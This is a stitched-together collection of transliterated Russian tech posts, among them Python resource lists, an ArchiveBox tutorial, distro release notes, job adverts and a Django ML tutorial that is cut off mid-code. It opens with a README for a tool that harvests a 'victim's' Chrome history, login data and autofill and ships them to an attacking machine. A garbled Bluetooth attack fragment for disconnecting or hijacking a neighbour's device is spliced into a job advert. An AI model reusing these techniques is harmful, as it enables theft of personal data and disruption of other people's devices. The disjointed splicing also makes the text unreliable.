"linux-chrome-recon" is a Information gathering tool used to enumerate all possible data about an user from Google-Chrome browser from any Linux distributionIntro1.Loots possible data from Google-Chrome  2.Launches HTTP Server on /tmp directory (Usefull)  3.Simple script to receive data from Victim(One time run)  4.Clears the /tmp data when server is closed...  Files retrieved :    History  Login Creds ( Cannot grab passwds , because its encrypted )  Keywords Searched  Autofill Data  Download History  Top Sites  User Profile Images    Installationhttps://github.com/monishmonish/linux-chrome-recon/cd linux-chrome-recon/pip3 install pandaspip3 install wget  To Run1.On Victim Machine  python3 server.py  2.On Attacking Machine  python3 receivedata.py  Here the RHOST value must be the IP of the Victime machine  Incase if you get any permission error while writing the data on attacker side  Try,  sudo chmod 777 linux-chrome-recon  To-DosIf your are reading this...  Make sure you can add more modules to this script and notify me... #enumeration #gathering #googlechrome #httpserver #informationextraction #informationgathering #informationretrieval #linux #linux-chrome-recon #loginforms..

Samye effektivnye resursy i materialy dlia izucheniia Python  Chto neobkhodimo dlia izucheniia Python? Knigi da videouroki? Ne tol'ko. V nashei podborke vy takzhe naidete kursy i interaktivnye "obuchalki".  Besplatnye kursy  Razdelim materialy na 2 iazykovye kategorii.  Russkii iazyk   Kachestvenno sostavlennye kursy ot Stepic: etot, ego prodolzhenie i zadachnik, v kotorom slozhnost' zadach napriamuiu zavisit ot vashego urovnia. Kurs v formate lektsii. Gramotno skroennyi kurs na Hexlet. Kurs na Intuit. Lektsii VMK MGU s udobnym tekhnicheskim planom (domashnie zadaniia uzhe neaktivny, zato lektsii dostupny).   Angliiskii iazyk   Google's Python Class: spetsial'nye kursy dlia izucheniia Python ot Google. A vot na Coursera mozhno naiti i platnye, i besplatnye kursy na raznykh iazykakh. Checkio predostavliaet vozmozhnost' vyuchit' iazyk programmirovaniia v igrovoi forme (takzhe est' JavaScript). Beginner Python3 Tutorials.   Besplatnye knigi  Predstavliaem vashemu vnimaniiu interaktivnyi uchebnik iazyka Python, kotoryi ne tol'ko daet teoriiu v udobnoi forme, no i pozvoliaet reshat' zadachi priamo na saite.  Takzhe rekomenduem oznakomit'sia s Python Tricks: A Buffet of Awesome Python Features - luchshei knigoi po Python, vypushchennoi v 2017 godu. V nei predstavleny kak prostye primery, tak i korotkie resheniia slozhnykh zadach. Vse s poshagovym opisaniem. Khorosho podoidet tem, kto znaet sintaksis i osnovnoi funktsional iazyka, no eshche ne do kontsa ponimaet algoritmy.  Python. Karmannyi spravochnik polnost'iu opravdyvaet svoe nazvanie. Ochen' udoben dlia bystrogo polucheniia nuzhnoi informatsii v protsesse razrabotki. Zdes' raskryvaetsia vse: tipy dannykh, operatory, vstroennye funktsii, metody, iskliucheniia, biblioteki i prochie instrumenty dannogo IaP.  Legkii sposob vyuchit' Python podoidet tem, kto nikogda ne programmiroval, no khochet nauchit'sia, i svoim pervym iazykom izbral Python. Eta kniga pomozhet osvoit'sia nachinaiushchim pitonistam. Vnimatel'no chitaite teoriiu i zapuskaite pervye rabochie programmy.  Platnye knigi  Avtostopom po Python - eto khoroshaia russkoiazychnaia kniga, sozdannaia na baze odnoimennogo rukovodstva. Ona vobrala v sebia narabotki spetsialistov, noveishie priemy i proverennye metody.  V Prostoi Python. Sovremennyi stil' programmirovaniia naidetsia poleznaia informatsiia dlia novichkov, uzhe obladaiushchikh koe-kakimi znaniiami v oblasti OOP. Podrobno opisyvaiutsia sovremennye instrumenty (pakety, biblioteki) i razlichnye kontseptsii Python.  Takzhe khochetsia otmetit' knigu Python na praktike. Ona prednaznachena dlia tekh, kto uzhe osvoil iazyk, no khochet pisat' bolee kachestvennye i nadezhnye programmy. V knige raskryvaiutsia sekrety elegantnogo koda, bystrodeistviia, grafiki i vysokourovnevogo setevogo programmirovaniia.  Stat'i  Obshchee   Izuchit' osnovy Python za 60 minut: razbiraem videokurs 20 voprosov i otvetov iz interv'iu na pozitsiiu Python-razrabotchika Python: praktiki dlia napisaniia effektivnogo koda Kak vyuchit' Python i naiti rabotu   Khitrosti i triuki   Strannosti iazyka Python, kotorye mogut vas ukusit' 10 skrytykh osobennostei Python Neskol'ko prodvinutykh priemov iazyka Python Uproshchenie Python koda s pomoshch'iu znakomykh instrumentov Triuki i sovety po Python, kotorye oblegchat vashu zhizn'   Tutorialy   Python: raspoznavanie ob'ektov v real'nom vremeni Sozdaem bota v Facebook na Python menee chem za 60 minut Pishem svoi blokchein Prostoi Telegram bot na Python vsego za 1 chas Neironnaia set' na Python v 15 strok koda dlia diagnostiki diabeta   Videouroki  Kanal DrapsTV raduet raznourovnevymi tutorialami. V ikh arsenale mozhno naiti takie pleilisty, kak:  Beginner  https://www.youtube.com/watch?v=kJv1QDfp1PM&list=PL1A2CSdiySGJd0LJRRSwQZbPZaDP0q67j  Intermediate  https://www.youtube.com/watch?v=JkmjK84Crcg&list=PL1A2CSdiySGLPTXm0cTxlGYbReGqTcGRA  Advanced  https://www.youtube.com/watch?v=CkIrizsP64c&list=PL1A2CSdiySGIPxpSlgzsZiWDavYTAx61d  Takzhe rekomenduem oznakomit'sia s etoi stat'ei: v nei sobrany samye raznye videomateraly dlia izucheniia Python.  #Python

in ternet-arkhi ve>>. No tuda vyg ruzha etsia daleko ne vse soder zhimoe sai ta: mno gie izob razheniia, skrip ty i vide oro liki naver niaka oka zhut sia nedos tupny. Chto by izbe zhat' podob nykh nep riiat nostei, sushches tvu et bes plat nyi ins tru ment ArchiveBox, o kotorom my segod nia i pogovo rim. Nes motria na to chto <<in ternet-arkhiv>> po pra vu schi taet sia odnim iz samykh populiar nykh ins tru men tov pois ka <<poterian nykh>> i uda len nykh veb-stra nits, on ime et riad ser' eznykh ogra niche nii. Vo-per vykh, on ne indeksi ruet stra nitsy v Facebook, <<VKon takte>> i dru gikh sots setiakh. Vo-vto rykh, v veb-arkhiv popada iut daleko ne vse raz dely sai ta. V-tret' ikh, tuda ne dobav liaiut sia resur sy i ikh raz dely, zak rytye ot indeksa tsii soot vets tvu iushchei ins truk tsiei v fai le robots.txt. V-chet vertykh, v arkhiv toch no ne popadut pred nazna chen nye dlia ska chiva niia fai ly, video- i audi oro liki i pro chie podob nye ele men ty. Na konets, esli otob razha emyi kon tent sai ta dinami ches ki soz daet sia s pomoshch'iu javascript ili dru gikh podob nykh ins tru men tov, pri sokh ranenii on mozhet chas tichno utra tit' sia ili <<polomat' sia>> -- v rezul' tate kopiia veb-stra nitsy budet vyg liadet' sov sem ne tak, kak ori ginal. To zhe samoe, ksta ti, kasa etsia veb-stra nits, sokh rania emykh iz interne ta na lokal' noi mashine stan dar tny mi sreds tva mi bra uze ra. Nap rashiva etsia vyvod: nuzhen al' ter nativ nyi ins tru ment, kotoryi poz volit soz davat' kopiiu vyb rannykh sai tov, pri chem smo zhet delat' eto bys tro, kaches tven no i nadezh no. Imen no dlia eto go i byl soz dan ArchiveBox. On poz volia et sokh ranit' avto nom nyi dub likat liubogo sai ta i vyg ruzit' v arkhiv vse ego soder zhimoe. Tselevye veb-resur sy mozh no zadat' po spis ku URL libo vziat' iz zak ladok ili isto rii bra uze ra. Sai ty budut vyg ruzheny vne zavisi mos ti ot nas tro ek robots.txt, zap reshcha iushchikh indeksa tsiiu. Vmes te s veb-stra nitsa mi sokh rania iutsia kar tinki, vstro ennye video, ele men ty javascript i pro chee polez noe soder zhimoe. Po lucha etsia eda kii per sonal' nyi <<arkhiv interne ta>>, kotorym ras poriazha esh' sia i upravlia esh' ty sam. Ins tru ment mozhet byt' polezen kak v kaches tve al' ter nativy ska chiva niiu veb-stra nichek na sobs tven nyi komp' iuter, tak i dlia issle dova niia zain tereso vav shego tebia sai ta -- v arkhivnoi kopii mozh no kopat' sia skol' ko dushe ugod no, ne opa saias' neozhi dan nostei. info Pol nyi tekst etoi stat'i dos tupen bez pod piski bla goda ria spon soru -- kom panii RUVDS, odno mu iz samykh peredo vykh khos ting-pro vai derov VPS/VDS-ser verov. RUVDS pred laga et vir tual' nye ser very v desiati data-tsen trakh urov nia TIER3 i vyshe po vse mu miru, niz kie tseny ot 30 rub lei v mesiats, udob nyi mar ket pleis i usta nov ku populiar nykh obra zov v odin klik. Ustanovka Dvi zhok ArchiveBox napisan na Python, ispol' zuet v svo ei rabote Wget i curl i ras schi tan na rabotu v sre de Linux i macOS, gde dlia nego ime iutsia vse neob khodimye kom ponen ty. Dlia zapus ka ArchiveBox v Windows mozh no ispol' zovat' Docker -- pod robnaia ins truk tsiia po raz verty vaniiu obra za est' na GitHub pro ekta. My zhe budem nas tra ivat' ArchiveBox v Linux, dlia chego ispol' zuem vir tual' nyi ser ver: eto obes pechit vysokos koros tnoi kanal svia zi s interne tom i dol zhnoe bys tro dei stvie, odnovre men no izba viv nas ot neob khodimos ti gorodit' ogo rod s usta nov koi vir tual' noi mashiny. V kaches tve ope ratsi onnoi sis temy byla vyb rana Ubuntu 20.04 LTS (v etoi ver sii Python vkliu chen v bazovuiu pos tavku sis temy), no podoi det, v prin tsipe, liuboi ras prostra nen nyi dis tri butiv Linux. Vot takuiu kon figura tsiiu ser vera my vyb rali dlia usta nov ki ArchiveBoxItak, dlia ArchiveBox neob khodim prezh de vse go Python, poeto mu dlia nachala zai dem na ser ver i pos motrim, kakaia ver siia usta nov lena v nashei sis teme: python3 -V Nam nuzh na ver siia ne nizhe 3.7. Sis tema rados tno otra por tovala, chto na ser vere usta nov len Python 3.8.5, poeto mu obnovliat' ego ne pri det sia. Esli zhe na tvo ei mashine obi taet pres tarelaia zmeia, obno vit' ver siiu mozh no koman doi sudo apt-get upgrade python3. Chto by usta novit' Python, ispol' zui koman du sudo apt-get install python3. Pro shche vse go usta novit' ArchiveBox s pomoshch'iu Pip -- ins tru men ta, poz volia iushche go zag ruzhat' pakety Python iz repozi toriia Python Package Index (PyPI). Esli etot kom ponent otsuts tvu et v sis teme, ego neob khodimo sna chala usta novit'. Dlia eto go vypol nim v ter minale sle duiushchie koman dy: sudo apt update sudo apt- get install python3- pip Obych no v kom plek te s Python 3 idet modul' Pip 3, no na vsia kii slu chai davai pro verim, kakaia ver siia Pip usta nov lena v sis teme: pip3 --version V nashem slu chae ser ver otra por toval, chto ver siia ime et nomer 20.0.2, i kak minimum my ube dilis', chto pip3 v sis teme pri suts tvu et. Otlichno, usta nav liva em sam ArchiveBox: pip3 install archivebox Us tanov ka ArchiveBox info Na lokal' noi mashine s Linux usta nov ku ArchiveBox nuzh no zapus kat' s ispol' zovani em sudo. ArchiveBox ne rabota et iz-pod pol' zovate lia root, poeto mu dlia nego nuzh no soz dat' otdel' nogo iuze ra s pomoshch'iu koman dy adduser username. Teper' ot ime ni uzhe eto go pol' zovate lia soz daem rabochuiu pap ku, v kotoruiu ArchiveBox budet skla dyvat' zag ruzhen nye sai ty: mkdir archives & & cd archives archivebox init Na etom pro tsedu ra usta nov ki i nas troi ki ins tru men ta zakon chena, mozh no perekho dit' k ego ispol' zovaniiu. Arkhiviruem saity Vse koman dy ArchiveBox ime iut obshchii vid $ archivebox [command] [parameter], gde command -- nepos reds tven no koman da, a parameter -- optsi onal' nyi kliuch. Dlia dobav leniia sai ta v arkhiv slu zhit koman da add. Tak, chto by sob rat' pod shivku nashego liubimo go zhur nala, nuzh no nab rat' v ter minale ArchiveBox avto mati ches ki soz dast v svo ei rabochei pap ke sub direk toriiu archive, v kotoruiu budet skla dyvat' ska chan nye sai ty -- kazh dyi v svo ei vlo zhen noi pap ke. V etoi zhe pap ke budet soz dan fail index.html, kuda dobav liaet sia obshchaia informa tsiia o zaar khiviro van nom sai te, chis le sob rannykh fai lov i ikh tipe. Na lokal' noi mashine ego mozh no otkryt' v bra uze re; esli zhe my ispol' zuem VPS, etot fail nam ne slish kom pomozhet, zato my smo zhem pros motret' soder zhimoe pap ki s arkhi vom v ter minale. So der zhimoe rabochei pap ki ArchiveBoxPo umol chaniiu ArchiveBox sokh rania et v arkhiv tol' ko veb-stra nitsu, uka zan nuiu v zadan nom URL. No mozh no zas tavit' ego vypol nit' rekur sivnyi obkhod vsekh ssy lok na etoi stra nitse s uka zan noi glu binoi pros motra i dobavit' tuda vse, chto po etim samym ssyl kam budet nai deno. Dlia eto go slu zhit parametr --depth=N, gde N -- glu bina pros motra ssy lok. Nap rimer, dlia togo chto by ArchiveBox zaar khiviro val glav nuiu stra nitsu sai ta i vse stra nitsy, ssyl ki na kotorye pri suts tvu iut na glav noi, mozh no ispol' zovat' koman du Pos kol' ku my arkhi viru em sai ty na ser ver VPS, dobychu nuzh no pred varitel' no ska chat' na lokal' nuiu mashinu s ispol' zovani em scp ili liubym dru gim udob nym spo sobom. Mozh no, nap rimer, usta novit' na ser vere vsftpd i poluchit' dos tup k soder zhimomu arkhi vov po FTP nepos reds tven no iz bra uze ra libo s pomoshch'iu liubogo FTP-kli enta. A eshche mozh no pod niat' tam Apache i peremes tit' soder zhimoe arkhi vov v domash niuiu pap ku veb-ser vera, chto by pros matri vat' ikh po HTTP. So der zhimoe arkhi va, dos tupnoe po FTPV rezul' tate vypol neniia koman dy archivebox add sait sokh rania etsia vmes te so vsem soder zhimym, vkliu chaia skrip ty, izob razheniia, CSS-fai ly. Ar khivnyi sait, dos tupnyi lokal' no pos le zag ruzki s ser veraArchiveBox ispol' zuet kon sol' nuiu uti litu youtube-dl dlia sokh raneniia video, bla goda ria chemu on mozhet tianut' roliki s eto go populiar nogo vide okhos tinga. Dlia ikh ska chiva niia ispol' zuet sia ta zhe koman da, s pomoshch'iu kotoroi sokh rania iutsia vse ostal' nye sai ty: Paketnaia arkhivatsiia saitov ArchiveBox tak zhe poz volia et ska chivat' nes kol' ko sai tov po spis ku, zadan nomu v tek sto vom fai le. Chto by ispol' zovat' etu voz mozhnost', soz dai pros toi tek sto vyi fail, nap rimer s ime nem urls.txt, i zapishi v nem adre sa sai tov, kotorye khochesh' ska chat', -- kazh dyi adres s novoi stro ki. Na uda len nom ser vere eto mozh no sde lat' s pomoshch'iu redak tora nano: nano urls. txt Za tem osta net sia lish' <<skor mit'>> etot fail arkhi vato ru: Est' u ArchiveBox eshche odna voz mozhnost': esli importi rovat' zak ladki bra uze ra v HTML-fail, a potom zag ruzit' ego na ser ver (pri ispol' zovanii ArchiveBox na lokal' noi mashine s linuk som eto go ne pot rebu etsia), to takoi fail tozhe mozhet slu zhit' spis kom URL dlia arkhi vatsii. V etom slu chae nuzh no ispol' zovat' sle duiushchuiu koman du: Vyvody V kaches tve ins tru men ta dlia kopiro vaniia internet-kon tenta ArchiveBox dovol' no udo ben. S ego pomoshch'iu mozh no sokh raniat' kak otdel' nye stra nitsy, tak i tselye raz dely sai tov dlia pos ledu iushche go izu cheniia na lokal' noi mashine ili na vir tual' nom ser vere, vypol niat' paket nuiu arkhi vatsiiu, a s pomoshch'iu cron -- kopiro vat' kon tent iz seti po ras pisaniiu. Be zus lovno, naibo lee kom for tno ispol' zovat' ArchiveBox na lokal' noi mashine s Linux ili macOS, no za neime niem takovykh soi det i vir tual' nyi ser ver. ArchiveBox vse eshche nakhodit sia v sta dii raz rabot ki i nep reryv no raz viva etsia, poeto mu uzhe v nedale kom budushchem v ego sos tave mogut poiavit' sia novye fun ktsii i voz mozhnos ti. Za obnovle niiami mozh no sle dit' na stra nich ke ArchiveBox na GitHub.

Dostupny distributivy Clonezilla Live 2.7.1 i GParted Live 1.2.0  Dostupen reliz Linux-distributiva Clonezilla Live 2.7.1, prednaznachennogo dlia bystrogo klonirovaniia diskov. V novoi versii: -- Osushchestvlena sinkhronizatsiia s paketnoi bazoi Debian Sid po sostoianiiu na 27 ianvaria.  -- Iadro Linux obnovleno do vypuska 5.10.9. -- V bazovyi sostav vkliucheny pakety glances, ipv6calc, atop, usbtop, bashtop, python3-psutil, vnstat i iperf3.  -- Dobavlen instrumentarii f3 dlia testirovaniia Flash-nakopitelei. -- Uluchshen mekhanizm opredeleniia nositelei s sistemami, rabotaiushchimi v Live-rezhime.  -- V ocs-sr predostavlena vozmozhnost' opredeleniia formata avtomaticheski naznachaemogo imeni obraza (mozhno vkliuchat' v imia faila datu, vremia, FQDN, UUID, MAC i t.p.). -- Obespechena podderzhka odnovremennogo razviortyvaniia neskol'kikh ustroistv cherez BitTorrent.  -- V ocs-sr i ocs-onthefly dobavlena vozmozhnost' vosstanovleniia i naznacheniia diska s priviazkoi k ego seriinomu nomeru. I drugie izmeneniia.  Odnovremenno dostupen reliz Live-distributiva GParted LiveCD 1.2.0, orientirovannogo na vosstanovlenie sistemy posle sboia i rabotu s diskovymi razdelami pri pomoshchi redaktora razdelov GParted. Razmer zagruzochnogo obraza 405 MB (amd64, i686). Distributiv sformirovan na paketnoi baze Debian Sid po sostoianiiu na 26 ianvaria i vkliuchaet novyi vypusk redaktora diskovykh razdelov GParted 1.2.0, v kotorom dobavlena podderzhka failovoi sistemy exFAT. Iadro Linux obnovleno do vypuska 5.10.

Kogda ia gotovilsia k EGE po russkomu iazyku (kstati sdal na 98, sniali odin pervichnyi ball za "tochnost' i vyrazitel'nost' rechi" v sochinenii), to napisal dlia zadaniia pro udareniia nebol'shoi skript na pitone. Vse ochen' prosto: zagruzhaete programmu sebe, zapuskaete v terminale "python3 emphasis.py". Ona budet kidat' vam randomnye slova iz slovaria FIPI, vy dolzhny vbit' v otvet eto zhe slovo, tol'ko udarnuiu bukvu napisat' zaglavnoi. Naprimer, esli programma napisala vam "veroispovedanie", vy v otvet pishite "veroispovEdanie" i nazhimaete Enter. Esli dobavite slova iz novogo slovaria FIPI, to prishlite v LS gruppy obnovlennyi skript.

!! Programmist - razrabotchik Middle Full-stack Otkryta vakansiia "programmist" v g. Ekaterinburg. Rassmatrivaem kandidatov s vysshim tekhnicheskim obrazovaniem i opytom raboty do 3 let. Predlagaem zadachi:-- Razrabotka i podderzhka sobstvennykh web-servisov kompanii, vnutrennie tekhnologicheskie resheniia.-- Podderzhka sushchestvuiushchikh proektov, dorabotka (ochen' priiatnoe Legacy).-- Prorabotka arkhitektury proektov s argumentirovannoi pozitsiei. Professional'nye navyki: 1. Vladenie stekom:-- php 5.x/7.x-- php freimvorki - Yii,Laravel, Symfony2, Phalcon (liuboi iz ukazannykh)-- JS/Typescript - Ember, Angular, React, Flux (liuboi iz ukazannykh)-- Postgresql/Mysql-- css - Bootstrap 3/4, Foundation, Materialize...-- Znanie printsipov oop i shablonov proektirovaniia.-- Opyt raboty s sistemami upravleniia versiiami(git/svn/mercurial)-- Opyt raboty v *nix sistemakh (ustanovka, nastroika). 2. Privetstvuiutsia znaniia:-- Python-- Asinkhronnoe programmirovanie na Python3(Asyncio, Twisted, etc..)-- Rabota s serverami ocheredei AMQP(ZeroMQ, RabbitMQ)-- Znanie setevykh tekhnologii, steka tcp/ip, rabota s setevym oborudovaniem urovnia dostupa/raspredeleniia-- Metodologii razrabotki: tdd, bdd Esli vy:-- Stremites' k professional'nomu rostu, obiazatel'ny, otvetstvenny-- Umeete predlagat' ratsional'nye resheniia postavlennykh zadach-- Umeete dekompozirovat' zadachi-- Natseleny na rezul'tat i proiavliaete initsiativu Zhdiom vashikh otklikov! Esli vas zainteresovala vakansiia, obiazatel'no otkliknites' na nee svoim reziume, i my soobshchim vam vse podrobnosti. Uznaiom Mac Adress ustroistva v radiuse vashego Bluetooth modulia Dlia etogo nam nuzhno vvesti v terminal: hcitool scan  I vam otkroetsia spisok Mac adresov, kopiruem odin iz nikh  2. Pochti finish Kogda pakety poidut est' 2 iskhoda sobytii 1 - Ustroistvo vykliuchitsia 2 - ustroistvo otkliuchitsia ot khoziaina i vy uspeshno podkliuchites' k chuzhomu devaisu Esli eto sosed dolbiashchii muzyku na vest' dom to interesny vse 2 varianta)))) 3 - Nichego ne proizoidiot (vozmozhno vy otpravili malo paketov, stav'te chislo v 1.5 - 2 raza bol'she)  Po vsem voprosam pisat' [https://vk.com/extremmer781|Adminu], skript pisal on)

Kak nastroit' virtual'noe okruzhenie virtualenv dlia Python3 (Ubuntu)  Programmiruia v Python (da i v liubom drugom iazyke s ustanovochnymi paketami) v opredelionnyi moment funktsional'nosti standartnoi biblioteki stanovitsia nedostatochno i prikhoditsia pribegat' k ustanovke storonnikh paketov-bibliotek. V Python dlia etogo ispol'zuetsia menedzher ustanovki paketov pip (dlia Python3 sootvetstvenno pip3).  Poka proekt vsego odin, vsio idiot khorosho, odnako v kakoi-to moment okazyvaetsia, chto v drugom proekte nuzhen takoi zhe paket, kak uzhe est', tol'ko drugoi versii. Takoe sluchaetsia, kogda biblioteki aktivno razvivaiutsia i v kakoi-to moment perestaiut podderzhivat' obratnuiu sovmestimost'. V takom sluchae, mozhno udalit' tekushchuiu versiiu i postavit' tu, v kotoroi vsio rabotaet. Uvy, takoe sluchaetsia dovol'no redko. V real'nosti skoree vsego neobkhodimo imet' dve raznykh versii odnogo paketa odnovremenno.  Chto zhe delat'? Rasskazyvaem v nashei stat'e: https://programforyou.ru/poleznoe/how-to-setup-virtualenv-for-python3  #stat'i@programforyou

Seichas nasha sistema umeet: 1) Analizirovat' effektivnost' lichnykh prodazh postavshchikov 2) Formirovat' rekomendatsii po optimizatsii postavok, raboty s assortimentov 3) Kompleksno analizirovat' konkurentov 4) Nakhodit' novye tovarnye nishi i mnogoe drugoe V planakh bol'shoi beklog interesnykh zadach po razvitiiu produkta, v t.ch. podkliuchenie novykh marketpleisov. Esli dlia tebia vazhno rabotat' nad ser'eznym i kraine ambitsioznym proektom i ty podkhodish' nam po kompetentsiiam, to my zhdem otklika. Kliuchevye kompetentsii: - Opyt v razrabotke ot piati let - Python3 - Django - DRF - Flask - SQLAlchemy -celery -scrapy -PostgreSQL Usloviia raboty Gonorar: po dogovorennosti v zavisimosti ot opyta. Razrabatyvaem i razviortyvaem sobstvennuiu platformu II s Python i Django  Vzliot iskusstvennogo intellekta priviol k populiarnosti platform mashinnogo obucheniia MLaaS. Esli vasha kompaniia ne sobiraetsia stroit' freimvork i razviortyvat' svoi sobstvennye modeli, est' shans, chto ona ispol'zuet nekotorye platformy MLaaS, naprimer H2O ili KNIME. Mnogie issledovateli dannykh, kotorye khotiat sekonomit' vremia, pol'zuiutsia etimi instrumentami, chtoby bystro prototipirovat' i testirovat' modeli, a pozzhe reshaiut, budut li ikh modeli rabotat' dal'she.  No ne boites' vsei etoi infrastruktury; chtoby poniat' etu stat'iu, dostatochno minimuma znanii iazyka Python i freimvorka Django. Spetsial'no k startu novogo potoka kursa po mashinnomu obucheniiu v etom poste pokazhem, kak bystro sozdat' sobstvennuiu platformu ML, sposobnuiu zapuskat' samye populiarnye algoritmy na letu. Portret Ornelly Muti Dzhozefa Aierle (fragment), rasschitannyi s pomoshch'iu tekhnologii iskusstvennogo intellekta.  Prezhde vsego vzglianite, pozhaluista, na sait, kotoryi ia razrabotal dlia etogo proekta, i pozvol'te mne pokazat' vam kratkoe vvedenie v to, chto mozhno sdelat' s etoi platformoi, v etom video.  Kak vidite, vy vybiraete samye populiarnye modeli s kontroliruemym i nekontroliruemym obucheniem i zapuskaete ikh vsego odnim shchelchkom myshi. Esli khochetsia poprobovat' te zhe nabory dannykh, chto i v video, vy mozhete skachat' ikh zdes'. Kruto, davaite posmotrim, kak eto sdelat'! Vozmozhno, vy rabotaete na noutbuke ili na oblachnom servere, ia ispol'zoval server Digital Ocean, prilozhenie rabotaet na Nginx i Gunicorn, i ia podrobno rasskazhu o tom, kak razviortyvat' ego: eto mozhet byt' polezno, kogda nuzhno razviortyvat' prilozheniia na Linux-servere kazhdyi den'. Davaite nachniom nastraivat' nashe okruzhenie s nekotorykh ustanovok:  sudo apt-get update sudo apt-get install python3-pip python3-dev libpq-dev postgresql postgresql-contrib nginx # install python postgresql and nginx # now install a postgresql database sudo -u postgres psql #log in to psql CREATE DATABASE myproject; #give a name to your database project CREATE USER myprojectuser WITH PASSWORD 'password'; # create user and password ALTER ROLE myprojectuser SET client_encoding TO 'utf8'; ALTER ROLE myprojectuser SET default_transaction_isolation TO 'read committed'; ALTER ROLE myprojectuser SET timezone TO 'UTC'; q # log out # cd to the folder where you want to keep your environment sudo -H pip3 install env virtualenv env # create a virtual environment for this project source myprojectenv/bin/activate pip install django gunicorn psycopg2 #install django and gunicorn # now cd to the directory where you want to create your project, in my case cd /www/var django-admin.py startproject trainyourmodel #cd trainyourmodel django-admin startapp portal # create an app for the views of this app #cd trainyourmodel again and nano settings.py   # now we configure our settings.py file DATABASES = { 'default': { 'ENGINE': 'django.db.backends.postgresql_psycopg2', 'NAME': 'myproject', 'USER': 'myprojectuser', 'PASSWORD': 'password', 'HOST': 'localhost', 'PORT': '', } } STATIC_URL = '/static/' STATIC_ROOT = os.path.join(BASE_DIR, 'static/')   Posle etogo vsio, chto Vam nuzhno sdelat', -- eto nastroit' Vashu konfiguratsiiu dlia servisa Gunicorn:  sudo nano /etc/systemd/system/gunicorn.service  [Unit] Description=gunicorn daemon After=network.target [Service] User=root Group=www-data WorkingDirectory=/var/www/trainyourmodel ExecStart=/opt/env/bin/gunicorn --access-logfile - --workers 3 --bind unix:/var/www/trainyourmodel/trainyourmodel.sock trainyourmodel.wsgi:application  sudo systemctl start gunicorn sudo systemctl enable gunicorn sudo systemctl status gunicorn gunicorn --bind 0.0.0.0:8000 trainyourmodel.wsgi   I dlia Nginx:  sudo nano /etc/nginx/sites-available/trainyourmodel  server { listen 80; server_name server_domain_or_IP; location = /favicon.ico { access_log off; log_not_found off; } location /static/ { root /var/www/trainyourmodel; } location / { include proxy_params; proxy_pass http://unix:/var/www/trainyourmodel/trainyourmodel.sock; } } #copy the same file also in sudo nano /etc/nginx/sites-enabled/trainyourmodel   sudo systemctl restart nginx sudo systemctl status nginx  Teper' vsio gotovo, i vy mozhete prosto klonirovat' kod iz moego GitHub-repozitoriia (tekushchaia vetka -- releasee-1.2) i ustanovit' vse nuzhnye pakety, prosto vypolniv komandu: pip -install -r requirements.txt  Prover'te tekhnicheskie kharakteristiki vashei sistemy, chtoby ubedit'sia, chto ona sootvetstvuet trebovaniiam (stoiat nuzhnye versii Python, Django i t. d.). Posle etogo vy uvidite tipichnye papki struktury proekta Django, a imenno:  Papka proekta trainyourmodel s failom settings.py. Papka prilozheniia pod nazvaniem Portral c failom views.py. Papka shablonov dlia koda .html.   Esli khochetsia sdelat' prilozhenie krasivym, nuzhno sozdat' papku so staticheskimi failami: failami oformleniia frontenda vashego shablona, no eto vykhodit za ramki stat'i. Esli vy ne znakomy s Django, vam neobkhodimo znat', chto etot freimvork razdeliaet fail bekenda s tablitsami vashei bazy dannykh (eti tablitsy nazyvaiutsia modeliami), i faily frontenda, kotorye nazyvaiutsia predstavleniiami i shablonami.  Ia ustanovil bazu dannykh na tot sluchai, esli zakhochu ispol'zovat' eio v budushchem, no poka my ne ispol'zuem nikakuiu bazu, tak kak budem zapuskat' modeli na letu, poetomu ia pomestil predstavleniia v papku pod nazvaniem portal, i tuda my razmestim ves' kod, zapushchennyi nashimi modeliami.  Prezhde vsego my importiruem vse biblioteki, kotorye nam ponadobiatsia dlia nashikh modelei mashinnogo obucheniia i postroeniia krasivykh grafikov onlain (Pandas, NumPy, sci-kit-learn, TensorFlow, Keras, Seaborn, Plotly i t. d.).  # This Python file uses the following encoding in format utf-8 import plotly import plotly.express as px import plotly.graph_objects as go from django.core.mail import send_mail, BadHeaderError, EmailMessage import io import csv from io import BytesIO import base64 import functools import operator import random import unicodedata import datetime import pandas as pd import seaborn as sns import numpy as np from efficient_apriori import apriori from sklearn import metrics from sklearn.cross_validation import train_test_split from sklearn.metrics import classification_report, confusion_matrix from sklearn.ensemble import RandomForestClassifier from sklearn.cluster import KMeans from sklearn.svm import SVC from sklearn.grid_search import GridSearchCV from sklearn.neighbors import KNeighborsClassifier from sklearn.tree import DecisionTreeClassifier from sklearn.linear_model import LinearRegression from sklearn.naive_bayes import GaussianNB import tensorflow as tf from tensorflow import keras from tensorflow.keras.models import Sequential from tensorflow.keras.layers import Dense, Dropout from tensorflow.keras.optimizers import RMSprop from django.template.loader import get_template, render_to_string from django.shortcuts import render from django.views.generic import TemplateView from django.views.generic.detail import DetailView from django.views import View from django.db.models import Count from django.shortcuts import redirect from portal.models import Subscribe from el_pagination.views import AjaxListView from django.http import Http404, JsonResponse, HttpResponse, HttpResponseRedirect, HttpResponseServerError from django.db.models import Q from django.contrib.staticfiles.templatetags.staticfiles import static  Teper' my gotovy sozdat' funktsiiu, kotoruiu ia nazval upload_csv, ona beriot CSV-fail, zagruzhennyi v nashi shablony, i sozdast freim dannykh Pandas. My budem delat' samye raznye veshchi s dannymi etogo faila, v zavisimosti ot zaprosov pol'zovatelia. Kogda pol'zovatel' klikaet po optsiiam frontenda, my sokhraniaem optsii v peremennoi, peremennaia, v svoiu ochered', mozhet prinimat' eti znacheniia:  _plot -- stroim grafik rasseianiia ili teplovuiu kartu. _cate -- vypolniaem algoritm Apriori dlia kategorial'nykh peremennykh. _unsuper -- vybiraem odin algoritm ML bez uchitelia. _super -- vypolniaem algoritm s uchitelem.   Kogda my klikaem po optsii, tip kontroliruemogo ili nekontroliruemogo algoritma khranitsia v peremennoi 'algo', zatem v zavisimosti ot togo, kakoi tip vybran, my zapuskaem druguiu model' iz optsii etom ekrane berutsia funktsiei pod nazvaniem neural, kotoraia budet rabotat' s neironnymi setiami. Est' dva tipa setei na vybor: <<mean-squared-error>> ili <<binary cross-entropy>>. Kak tol'ko funktsiia proveriaet tip seti dlia zapuska, ona beriot epokhi, paket, znacheniia plotnosti i vyvodit na ekran model' Keras, pokazyvaia tochnost' prognozov, poluchaetsia chto-to vrode etogo:  def neural(request): if request.method == "POST": file = request.FILES['file'] df = pd.read_csv(file) df_target = df lon = len(list(df.head(0))) dim = len(list(df.head(0))) -1 header = list(df[0:lon]) target = header[dim] y = np.array(df[target]) df.drop(target,axis=1,inplace=True) X = df.values X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.3,random_state=101) 